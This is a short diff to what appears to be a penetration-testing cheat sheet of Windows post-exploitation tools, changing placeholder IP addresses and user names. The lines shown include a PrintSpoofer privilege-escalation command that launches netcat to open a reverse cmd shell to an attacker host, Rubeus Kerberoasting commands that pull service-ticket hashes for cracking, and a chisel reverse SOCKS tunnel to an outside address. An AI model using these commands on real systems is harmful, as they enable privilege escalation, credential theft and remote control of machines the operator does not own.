@@ -23,7 +23,7 @@ netcat Win binary, for port listening and reverse shell
 
 ### printspoofer
 To escalate with SeImpersonatePrivilege & SeAssignPrimaryTokenPrivilege  
-PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"  
+PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.10.10 4545 -e cmd"  
 
 
 ### Rubeus
@@ -32,7 +32,7 @@ Kerberoasting from windows machine
 PS C:\> .\Rubeus.exe kerberoast /stats  #to gather some stats  
 PS C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap  #/nowrap to copy hash easily  
 PS C:\> .\Rubeus.exe kerberoast /user:"username" /nowrap  #to test spesific user  
-PS C:\> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap  #RC4 encryption for a new service ticket  
+PS C:\> .\Rubeus.exe kerberoast /tgtdeleg /user:"username" /nowrap  #RC4 encryption for a new service ticket  
 
 
 ### SharpHound.exe
@@ -50,7 +50,7 @@ PS C:\> .\Snaffler.exe  -d <DomainName> -s -v data
 https://github.com/jpillora/chisel  
 Pre-compiled Chisel for port-forwarding, both linux and windows  
 sudo ./chisel server --reverse -v -p 1234 --socks5  
-./chisel.exe client -v <YourIP>:1234 R:socks  
+./chisel.exe client -v 10.10.10.10:1234 R:socks  
   
 
 ### Lazagne
